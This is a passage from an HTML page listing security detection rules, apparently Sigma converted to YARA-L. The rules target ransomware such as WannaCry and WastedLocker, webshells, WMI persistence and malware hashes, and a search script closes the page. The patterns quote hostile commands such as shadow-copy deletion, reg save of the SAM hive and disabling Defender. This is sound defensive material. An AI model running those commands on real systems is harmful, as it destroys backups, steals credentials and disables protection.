"CA0296FA9F48E83EA3F26988401B3F4C4E655F7A" or $selection.target.file.md5 = "D4C6540E789BD3839D65E7EDA5CCA8832493649E" or $selection.target.file.md5 = "D5EDE1BBB9A12757E24BE283AFC8D746ADC4A0D4" or $selection.target.file.md5 = "DEFBFD98C74BEFF839EEB189F0F6C385AD6BA19B" or $selection.target.file.md5 = "ECF152EB6417A069573F2C7D9A35B9CC31EC8F56" or $selection.target.file.md5 = "EE2D40825C77C8DFEF67999F0C521919E6672A10" or $selection.target.file.md5 = "EF09AC6BA08A116F2C4080CBEE8CEF9523E21265" or $selection.target.file.md5 = "F414C49CF502D1B6CC46E08F3AC97D7846B30732")) condition: $selection 
<li><a href="#">rule vulnerable_netlogon_secure_channel_connection_allowed { meta: author = "NVISO" description = "Detects that a vulnerable Netlogon secure channel connection was allowed, which could be an indicator of CVE-2020-1472. License: ." reference = "" version = "0.01" created = "2020/09/15" events: $event.metadata.product_log_id = "5829" condition: $event 
<li><a href="#">rule wannacry_ransomware { meta: author = "Florian Roth (rule), Tom U. @c_APT_ure (collection)" description = "Detects WannaCry ransomware activity License: . @c_APT_ure (collection)." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" events: (($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and ((re.regex($selection1.target.process.file.full_path, `.*\\tasksche\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\mssecsvc\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\taskdl\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\@WanaDecryptor@.*`) or re.regex($selection1.target.process.file.full_path, `.*\\WanaDecryptor.*`) or re.regex($selection1.target.process.file.full_path, `.*\\taskhsvc\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\taskse\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\111\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\lhdfrgui\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\diskpart\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\linuxnew\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\wannacry\.exe`)) or (re.regex($selection1.target.process.command_line, `.*icacls .* /grant Everyone:F /T /C /Q.*`) or re.regex($selection1.target.process.command_line, `.*bcdedit /set {default} recoveryenabled no.*`) or re.regex($selection1.target.process.command_line, `.*wbadmin delete catalog -quiet.*`) or re.regex($selection1.target.process.command_line, `.*@Please_Read_Me@\.txt.*`)))) condition: $selection1 
<li><a href="#">rule wannacry_ransomware_via_sysmon { meta: author = "Florian Roth (rule), Tom U. @c_APT_ure (collection)" description = "Detects WannaCry ransomware activity via Sysmon License: . @c_APT_ure (collection)." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" events: (($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and ((re.regex($selection1.target.process.file.full_path, `.*\\tasksche\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\mssecsvc\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\taskdl\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\@WanaDecryptor@.*`) or re.regex($selection1.target.process.file.full_path, `.*\\taskhsvc\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\taskse\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\111\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\lhdfrgui\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\diskpart\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\linuxnew\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\wannacry\.exe`)) or (re.regex($selection1.target.process.command_line, `.*vssadmin delete shadows.*`) or re.regex($selection1.target.process.command_line, `.*icacls .* /grant Everyone:F /T /C /Q.*`) or re.regex($selection1.target.process.command_line, `.*bcdedit /set {default} recoveryenabled no.*`) or re.regex($selection1.target.process.command_line, `.*wbadmin delete catalog -quiet.*`) or re.regex($selection1.target.process.command_line, `.*@Please_Read_Me@\.txt.*`)))) condition: $selection1 
<li><a href="#">rule wastedlocker_a_new_ransomware_variant_developed_by_the_evil_corp_group { meta: author = "Osman Demir" description = "Detects Wastedlocker License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1486, Impact" events: ($selection.metadata.product_event_type = "1" and (($selection.target.process.command_line = "C:\\Windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true ; Set-MpPreference -MAPSReporting 0 ; Set-MpPreference -ExclusionProcess rundll32.exe ; Set-MpPreference -ExclusionExtension dll" or $selection.target.process.command_line = "C:\\Windows\\System32\\netsh.exe advfirewall firewall add rule name=\"Rundll32\" dir=out action=allow protocol=any program=\"C:\\Windows\\system32\\rundll32.exe") or (($selection.target.process.file.full_path = "vssadmin.exe" or $selection.target.process.file.full_path = "sc.exe" or $selection.target.process.file.full_path = "net.exe" or $selection.target.process.file.full_path = "net1.exe" or $selection.target.process.file.full_path = "netsh.exe" or $selection.target.process.file.full_path = "cscript.exe" or $selection.target.process.file.full_path = "wscript.exe") and (re.regex($selection.target.process.command_line, `.*Delete Shadows /all /quiet.*`) or re.regex($selection.target.process.command_line, `.*resize shadowstorage.*`) or re.regex($selection.target.process.command_line, `.*stop NetBackup BMR MTFTP Service /y.*`) or re.regex($selection.target.process.command_line, `.*\.jse.*`) or re.regex($selection.target.process.command_line, `.*\.js.*`) or re.regex($selection.target.process.command_line, `.*\.zip.*`) or re.regex($selection.target.process.command_line, `.*stop BMR Boot Service /y.*`) or re.regex($selection.target.process.command_line, `.*stop avpsus /y.*`) or re.regex($selection.target.process.command_line, `.*sc stop WinDefend/y.*`) or re.regex($selection.target.process.command_line, `.*sc config WinDefend start= disabled /y.*`) or re.regex($selection.target.process.command_line, `.*config SQLTELEMETRY start= disabled.*`) or re.regex($selection.target.process.command_line, `.*config SQLWriter start= disabled.*`) or re.regex($selection.target.process.command_line, `.*config SstpSvc start= disabled.*`))))) condition: $selection 
<li><a href="#">rule wastedlocker_ransomware_hunting_credential_dumping { meta: author = "Ariel Millahuel" description = "This rule its part of Cisco Talos investigation about this ransomware, and includes a lot of ATT&CK techniques that i'll be writing in different rules. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "credential_access, T1086, T1035" events: ($selection1.target.process.file.full_path = "reg.exe" and ($selection1.target.process.command_line = "reg save HKLM\\SAM C:\\programdata\\SamBkup.hiv" or $selection1.target.process.command_line = "reg save HKLM\\SYSTEM C:\\programdata\\FileName.hiv") and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1")) condition: $selection1 
<li><a href="#">rule wastedlocker_ransomware_hunting_defense_evasion { meta: author = "Ariel Millahuel" description = "This rule its part of Cisco Talos investigation about this ransomware, and includes a lot of ATT&CK techniques that i'll be writing in different rules. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "defense_evasion, T1027.004, T1070.001" events: (($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and ((($selection1.target.process.file.full_path = "cvtres.exe" and re.regex($selection1.target.process.command_line, `.*cvtres\.exe /NOLOGO /READONLY /MACHINE:.* /OUT:C:\\Users.*\\AppData\\Local\\Temp\\RESF8F4\.tmp c:\\Users.*\\AppData\\Local\\Temp\\h4bie4kg\\CSC81E10858D57A44649763EE5728D5E87\.TMP.*`)) or ($selection1.target.process.file.full_path = "PsExec.exe.exe" and re.regex($selection1.target.process.command_line, `PsExec\.exe -s .* cmd /c for /F tokens=.* %1 in \('wevtutil\.exe el'\) DO wevtutil\.exe cl %1`))) or ($selection1.target.process.file.full_path = "csc.exe" and re.regex($selection1.target.process.command_line, `csc\.exe /noconfig /fullpaths @C:\\Users.*\\AppData\\Local\\Temp\\h4bie4kg\\h4bie4kg\.cmdline`)))) condition: $selection1 
<li><a href="#">rule wastedlocker_ransomware_hunting_initial_access_and_compromise { meta: author = "Ariel Millahuel" description = "This rule its part of Cisco Talos investigation about this ransomware, and includes a lot of ATT&CK techniques that i'll be writing in different rules. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "initial_access, T1189" events: ($selection1.target.process.file.full_path = "wscript.exe" and re.regex($selection1.target.process.command_line, `wscript\.exe C:\\Users.*\\AppData\\Local\\Temp\\Temp1_Chrome\.Update\.b343b0\.zip\\Chrome\.Update\.c9a747\.js`) and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1")) condition: $selection1 
<li><a href="#">rule webshell_detection_with_command_line_keywords { meta: author = "Florian Roth" description = "Detects certain command line parameters often used during reconnaissance activity via web shells License: ." reference = "" version = "0.01" created = "2017/01/01" category = "process_creation" product = "windows" mitre = "privilege_escalation, persistence, t1100" events: ((re.regex($selection.src.process.file.full_path, `.*\\apache.*`) or re.regex($selection.src.process.file.full_path, `.*\\tomcat.*`) or re.regex($selection.src.process.file.full_path, `.*\\w3wp\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\php-cgi\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\nginx\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\httpd\.exe`)) and (re.regex($selection.target.process.command_line, `.*whoami.*`) or re.regex($selection.target.process.command_line, `.*net user .*`) or re.regex($selection.target.process.command_line, `.*ping -n .*`) or re.regex($selection.target.process.command_line, `.*systeminfo`) or re.regex($selection.target.process.command_line, `.*&cd&echo.*`) or re.regex($selection.target.process.command_line, `.*cd /d.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule webshell_detection_with_sysmon_logs { meta: author = "Emir Erdogan" description = "It only detects a webshell on a IIS webservers. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "privilege_escalation, Web_Shell, t1100" events: (re.regex($selection.src.process.file.full_path, `.*\\w3wp\.exe`) and re.regex($selection.target.process.file.full_path, `.*\\cmd\.exe`)) condition: $selection 
<li><a href="#">rule whoami_execution { meta: author = "Florian Roth" description = "Detects the execution of whoami, which is often used by attackers after exloitation / privilege escalation but rarely used by administrators License: ." reference = "" version = "0.01" created = "2018/05/22" product = "windows" service = "sysmon" mitre = "discovery, t1033" events: ($selection.metadata.product_event_type = "1" and $selection.target.process.command_line = "whoami") condition: $selection 
<li><a href="#">rule whoami_execution_part_1 { meta: author = "Florian Roth" description = "Detects the execution of whoami, which is often used by attackers after exloitation / privilege escalation but rarely used by administrators License: ." reference = "" version = "0.01" created = "2018/05/22" product = "windows" service = "security" mitre = "discovery, t1033" events: ($selection.metadata.product_event_type = "4688" and re.regex($selection.target.process.command_line, `.*\\whoami\.exe`)) condition: $selection 
<li><a href="#">rule windows_10_scheduled_task_sandboxescaper_0day { meta: author = "Olaf Hartong" description = "Detects Task Scheduler .job import arbitrary DACL write\\par License: ." reference = "" version = "0.01" created = "2019/05/22" category = "process_creation" product = "windows" mitre = "privilege_escalation, execution, t1053, car.2013-08-001" events: ($selection.target.process.file.full_path = "schtasks.exe" and re.regex($selection.target.process.command_line, `.*/change.*/TN.*/RU.*/RP.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule windows_powershell_user_agent { meta: author = "Florian Roth" description = "Detects Windows PowerShell Web Access License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" events: re.regex($selection.src.application, `.* WindowsPowerShell/.*`) condition: $selection 
<li><a href="#">rule windows_powershell_webdav_user_agent { meta: author = "Florian Roth" description = "Detects Windows PowerShell Web Access License: ." reference = "" version = "0.01" created = "2018/04/06" category = "proxy" events: re.regex($selection.src.application, `Microsoft-WebDAV-MiniRedir/.*`) condition: $selection 
<li><a href="#">rule windows_shell_spawning_suspicious_program { meta: author = "Florian Roth" description = "Detects a suspicious child process of a Windows shell License: ." reference = "" version = "0.01" created = "2018/04/06" category = "process_creation" product = "windows" mitre = "execution, defense_evasion, t1064" events: (((re.regex($selection.src.process.file.full_path, `.*\\mshta\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\powershell\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\rundll32\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\cscript\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\wscript\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\wmiprvse\.exe`)) and (re.regex($selection.target.process.file.full_path, `.*\\schtasks\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\nslookup\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\certutil\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\bitsadmin\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\mshta\.exe`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) and not (re.regex($selection.principal.file.full_path, `.*\\ccmcache\\.*`))) condition: $selection 
<li><a href="#">rule winrm_configuration_detector { meta: author = "Lee Archinal" description = "This detects when WinRM configuration has changed License: ." reference = "" version = "0.01" created = "2019/04/30" product = "windows" service = "sysmon" mitre = "lateral_movement, execution, t1028" events: ($selection.metadata.product_event_type = "1" and $selection.target.process.command_line = "winrm/config/listener" and re.regex($selection.target.process.file.full_path, `.*\\cscript\.exe`)) condition: $selection 
<li><a href="#">rule winrm_session_created_sysmon_behavior { meta: author = "Lee Archinal" description = "This detects when a remote session is created on a machine License: ." reference = "" version = "0.01" created = "2019/06/30" product = "windows" service = "sysmon" mitre = "lateral_movement, t1028" events: ($selection1.metadata.product_event_type = "3" and re.regex($selection1.target.process.file.full_path, `.*powershell\.exe`) and re.regex($selection1.principal.port, `.*`) and $selection1.target.port = "5985") condition: $selection1 
<li><a href="#">rule wmi_event_subscription { meta: author = "Tom Ueltschi (@c_APT_ure)" description = "Detects creation of WMI event subscription persistence method License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Persistence, t1084, Execution, t1047" events: ($selector.metadata.product_event_type = "19" or $selector.metadata.product_event_type = "20" or $selector.metadata.product_event_type = "21") condition: $selector 
<li><a href="#">rule wmi_persistence__command_line_event_consumer { meta: author = "Thomas Patzke" description = "Detects WMI command line event consumers License: ." reference = "" version = "0.01" created = "2018/03/07" product = "windows" service = "sysmon" mitre = "t1084, persistence" events: ($selection.metadata.product_event_type = "7" and $selection.target.process.file.full_path = "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe" and $selection.target.process.file.full_path = "wbemcons.dll") condition: $selection 
<li><a href="#">rule wmi_persistence__script_event_consumer { meta: author = "Thomas Patzke" description = "Detects WMI script event consumers License: ." reference = "" version = "0.01" created = "2018/03/07" category = "process_creation" product = "windows" mitre = "execution, persistence, t1047" events: ($selection.target.process.file.full_path = "C:\\WINDOWS\\system32\\wbem\\scrcons.exe" and $selection.src.process.file.full_path = "C:\\Windows\\System32\\svchost.exe" and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule wmi_spawning_windows_powershell { meta: author = "Markus Neis / @Karneades" description = "Detects WMI spawning PowerShell License: ." reference = "" version = "0.01" created = "2019/04/03" category = "process_creation" product = "windows" mitre = "execution, defense_evasion, t1064" events: ((re.regex($selection.src.process.file.full_path, `.*\\wmiprvse\.exe`) and re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) and not (re.regex($selection.target.process.command_line, `.*&amp;.*`))) condition: $selection 
<li><a href="#">rule wmiexec_vbs_script { meta: author = "Florian Roth" description = "Detects suspicious file execution by wscript and cscript License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "execution, g0045, t1064" events: ($selection.metadata.product_event_type = "1" and re.regex($selection.target.process.file.full_path, `.*\\cscript\.exe`) and re.regex($selection.target.process.command_line, `.*\.vbs /shell .*`)) condition: $selection 
<li><a href="#">rule wsfjsejsvbavbe_file_execution_sysmon { meta: author = "Michael Haag, Alexandr Yampolskyi" description = "Detects suspicious file execution by wscript and cscript. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Execution, t1059, t1204" events: ($selection.metadata.product_event_type = "1" and (re.regex($selection.target.process.file.full_path, `.*wscript\.exe`) or re.regex($selection.target.process.file.full_path, `.*cscript\.exe`)) and (re.regex($selection.target.process.command_line, `.*\.jse.*`) or re.regex($selection.target.process.command_line, `.*\.vbe.*`) or re.regex($selection.target.process.command_line, `.*\.js.*`) or re.regex($selection.target.process.command_line, `.*\.vba.*`))) condition: $selection 
<li><a href="#">rule yispecter_malware_detection { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "YiSpecter Malware C2 Domains And Subdomains Communication Detection. License: ." reference = "" version = "0.01" created = "2015/10/4" product = "proxy" mitre = "Command and Control, t1071, t1043" events: ($selection.target.hostname = "bb800.com" or $selection.target.hostname = "ad.bb800.com" or $selection.target.hostname = "down.bb800.com" or $selection.target.hostname = "ty1.bb800.com" or $selection.target.hostname = "iosnoico.bb800.com" or $selection.target.hostname = "qvod.bb800.com" or $selection.target.hostname = "qvios.od.bb800.com" or $selection.target.hostname = "dp.bb800.com" or $selection.target.hostname = "iosads.cdn.bb800.com") condition: $selection 
<li><a href="#">rule zebrocy_tool_apt28_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "Zebrocy Tool Detector. License: ." reference = "" version = "0.01" created = "2018/12/23" product = "windows" service = "sysmon" mitre = "Execution, t1204, tool.zebrocy" events: ($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "7768fd2812ceff05db8f969a7bed1de5615bfc5a" or $selection.target.file.md5 = "da70c54a8b9fd236793bb2ab3f8a50e6cd37e2df" or $selection.target.file.md5 = "a225d457c3396e647ffc710cd1edd4c74dc57152" or $selection.target.file.md5 = "a659a765536d2099ecbde988d6763028ff92752e" or $selection.target.file.md5 = "20954fe36388ae8b1174424c8e4996ea2689f747" or $selection.target.file.md5 = "e0d8829d2e76e9bb02e3b375981181ae02462c43" or $selection.target.file.md5 = "d697160aecf152a81a89a6b5a7d9e1b8b5e121724038c676157ac72f20364edc" or $selection.target.file.md5 = "cba5ab65a24be52214736bc1a5bc984953a9c15d0a3826d5b15e94036e5497df" or $selection.target.file.md5 = "25f0d1cbcc53d8cfd6d848e12895ce376fbbfaf279be591774b28f70852a4fd8" or $selection.target.file.md5 = "115fd8c619fa173622c7a1e84efdf6fed08a25d3ca3095404dcbd5ac3deb1f03" or $selection.target.file.md5 = "f27836430742c9e014e1b080d89c47e43db299c2e00d0c0801a2830b41b57bc1" or $selection.target.file.md5 = "5b5e80f63c04402d0b282e95e32155b2f86cf604a6837853ab467111d4ac15e2" or $selection.target.file.md5 = "dd7e69e14c88972ac173132b90b3f4bfb2d1faec15cca256a256dd3a12b6e75d" or $selection.target.file.md5 = "15a866c3c18046022a810aa97eaf2e20f942b8293b9cb6b4d5fb7746242c25b7" or $selection.target.file.md5 = "602d2901d55c2720f955503456ac2f68" or $selection.target.file.md5 = "47a026d93ae8e0cc292e8d7a71ddc89e" or $selection.target.file.md5 = "26b213343bac2b4c69a261a2f5c00e89" or $selection.target.file.md5 = "672f85ee2031c1ff6295b17058e30e07" or $selection.target.file.md5 = "e49728cee1fdbbb957f657361fba3c9f" or $selection.target.file.md5 = "02c46f30f4c68a442cf7e13bebe8d3f8" or $selection.target.file.md5 = "6bc5f53d4082f12dd83aca45bae81e64")) condition: $selection 
<li><a href="#">rule zombieboy_cryptomining_worm_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "ZombieBoy CryptoMining Worm Detector. License: ." reference = "" version = "0.01" created = "2018/07/18" product = "windows" service = "sysmon" mitre = "Execution, t1204" events: ($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "049fc01447f15e02fff88a2b10f1518c8489e97b2c26006b4962ff5005e460dc" or $selection.target.file.md5 = "22f105dc2e2574ba3ea2ac4152391ce3bbaaa415a9660c251638281bbc5e8f33" or $selection.target.file.md5 = "2628242abba9b99baf26dadc071739fed2559bb7251d69ab81edc404d4bae602" or $selection.target.file.md5 = "27c5e2f35a5fb9272c3ed7c746927ce8c61b3ce02fed7551129dc2a32bf20773" or $selection.target.file.md5 = "27d4684511314ef9631e162e1bdc5170185689abf16f7f28ba5ae397ba601197" or $selection.target.file.md5 = "38d7d4f6a712bff4ab212848802f5f9c" or $selection.target.file.md5 = "5d33434111ee36d754155c1d236e65aa78eaa605587715a5931b1c1ed3a54745" or $selection.target.file.md5 = "5ea00496a4073982855f81e463a887d6a8ef263c87bb203161e2db3f50cfc8c0" or $selection.target.file.md5 = "65cd6ab10712cfeb82872d6d3648a99636c9e0fff5728a0fc34497142c952173" or $selection.target.file.md5 = "673bb55f781aaef382f4f9c9a748690d8b1045864151adaf67a4c0ab669e4700" or $selection.target.file.md5 = "6de21f2fd11d68b305b5e10d97b3f27e" or $selection.target.file.md5 = "7327ef046fe62a26e5571c36b5c2c417" or $selection.target.file.md5 = "785a7f6e1cd40b50ad788e5d7d3c8465" or $selection.target.file.md5 = "79c6ead6fa4f4addd7f2f019716dd6ca" or $selection.target.file.md5 = "7bb89b498beab4402d5cc8602c484a309ece50aa94c14f0a43f091f43b09f88f" or $selection.target.file.md5 = "7bc7d0fafd40438989c0445db8b3886868847da88979e35feebea9ff1b0655cb" or $selection.target.file.md5 = "842133ddc2d57fd0f78491b7ba39a34d" or $selection.target.file.md5 = "865cea806bc95acd56d215b2c3c3b892d9715495bdcf272b2bf2106326c13a30" or $selection.target.file.md5 = "876c2c8a45414c143e2fc5622d6cfe84050a45ae052ca9263beab280778ae380" or $selection.target.file.md5 = "8b532b41c25958f04495ca43d1f2a57f6d11fd3d6401f8d971e1299683828e52" or $selection.target.file.md5 = "91ebe2de7fcb922c794a891ff8987124" or $selection.target.file.md5 = "9a46a3ae2c3762964c5cbb63b62d7dee" or $selection.target.file.md5 = "a178196089fadecf8314e36fab17884f6894bdddd6e238652f99909a93db93a2" or $selection.target.file.md5 = "a3ae8a77a1f238e7b5ebd3dd3953912d9e5ae8fdf5cee6a536e7eba658ee2e1e" or $selection.target.file.md5 = "bb0a0a06f3bff97a1e7de8909d26c0ecb5161ea3882f587163d422042d9196a5" or $selection.target.file.md5 = "cc4a5ed98d8f4074ee700f5762ee0745f365605b90c62746990566413a7bf63e" or $selection.target.file.md5 = "dfc0ea5813e78492bc78d134d1d8372ca9d04ad563835d890614cd11b2555dd3" or $selection.target.file.md5 = "f1e23e2428f0f162c05bd259be133a1957438901a10041c128c3f63b72dd91d6" or $selection.target.file.md5 = "fd2c2cf66b166807470cbe2eafb3e0fab5947937f243fca87651d04bb6c9fd2d")) condition: $selection 
<li><a href="#">rule zoom_and_microsoft_malware_attacks_detection { meta: author = "Furkan Celik" description = "What's more, the researchers said they detected malicious files with the name \"zoom-us-zoom_##########.exe,\" which when executed, installed potentially unwanted programs (PUPs) such as InstallCore, a dodgy bundleware application that's known to install other kinds of malware. Additionally, we have detected malicious files with names such as \"zoom-us-zoom_##########.exe\" and \"microsoft-teams_V#mu#D_##########.exe\" (# representing various digits). The running of these files leads to an installation of the infamous InstallCore PUA on the victimâ€™s computer which could potentially lead to additional malicious software installation. License: ." reference = "" version = "0.01" created = "2020/03/30" product = "windows" service = "security" mitre = "T1486, impact" events: ($selection.metadata.product_event_type = "4688" and (re.regex($selection.target.process.file.full_path, `zoom-us-zoom_.*\.exe`) or re.regex($selection.target.process.file.full_path, `microsoft-teams_V.*mu.*D_.*\.exe`))) condition: $selection 
<li><a href="#">rule zoom_phishing_email_fake_zoom_login_page__credential_stealer { meta: author = "Osman Demir" description = "Detects Phishing Email License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" mitre = "T1192, initial_access" events: ($selection.security_result.action = "allowed" and $selection.target.url = "") condition: $selection 
<li><a href="#">rule zusy_malware_detector_sysmon_behavior_august_2019 { meta: author = "Lee Archinal" description = "This content detects charactaristics of the Zusy malware strain License: ." reference = "" version = "0.01" created = "2019/08/16" product = "windows" service = "sysmon" mitre = "persistence, t1060" events: ((($selection1.metadata.product_event_type = "13" and $selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN" and $selection1.metadata.description = "F5DBF765") or ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `C:\\Users.*\\AppData\\Roaming\\5145C9BD\\bin\.exe`) or re.regex($selection1.target.file.full_path, `.*\\AppData\\LocalLow\\F5DBF765`) or re.regex($selection1.target.file.full_path, `.*\\F5DBF765`) or re.regex($selection1.target.file.full_path, `.*\\F5DBF765\\bin\.exe`)))) or ($selection1.metadata.product_event_type = "1" and (re.regex($selection1.target.process.file.full_path, `.*\\AppData\\Roaming\\5145C9BD\\bin\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\F5DBF765\\bin\.exe`)))) condition: $selection1 } 

</div>
<script>
function myFunction() {
var input, filter, ul, li, a, i, txtValue;
input = document.getElementById("myInput");
filter = input.value.toUpperCase();
ul = document.getElementById("myUL");
li = ul.getElementsByTagName("li");
for (i = 0; i < li.length; i++) {
a = li[i].getElementsByTagName("a")[0];
txtValue = a.textContent || a.innerText;
if (txtValue.toUpperCase().indexOf(filter) > -1) {
li[i].style.display = "";
} else {
li[i].style.display = "none";
}
}
}
</script>
<script src="hilitor.js"></script>
<script>
var myHilitor = new Hilitor("content"); // id of the element to parse
// myHilitor.setBreakRegExp(new RegExp('[^\\w\' -]+', "g")); // expanded to include spaces
myHilitor.apply();
</script>
<script>
window.addEventListener("DOMContentLoaded", function(e) {
var myHilitor2 = new Hilitor("playground");
myHilitor2.setMatchType("left");
document.getElementById("keywords").addEventListener("keyup", function(e) {
myHilitor2.apply(this.value);
}, false);
}, false);
</script>
</html>